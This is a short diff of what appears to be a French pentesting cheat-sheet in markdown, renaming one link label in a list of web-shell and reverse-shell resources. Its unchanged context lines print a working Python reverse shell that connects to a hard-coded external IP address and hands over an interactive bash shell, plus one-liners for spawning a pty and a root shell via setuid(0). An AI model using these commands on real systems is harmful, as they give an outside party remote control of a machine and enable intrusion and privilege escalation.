@@ -11,7 +11,7 @@
 
 - [Simple-PHP-Web-Shell](https://github.com/artyuum/simple-php-web-shell)
 - [Reverse shell assisté](https://github.com/t0thkr1s/revshellgen)
-- [Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
+- [Liste en plusieurs language Reverse shell](https://www.synetis.com/etablir-un-reverse-shell-en-une-ligne/)
 	- `python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("81.253.72.139",53));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/bash","-i"]);'`
 	- `python -c 'import pty;pty.spawn (‘’/bin/bash’’)’`
 	- Spawn un shell root --> `python3 -c 'import pty,os; os.setuid(0);os.setgid(0);pty.spawn("/bin/bash")'`
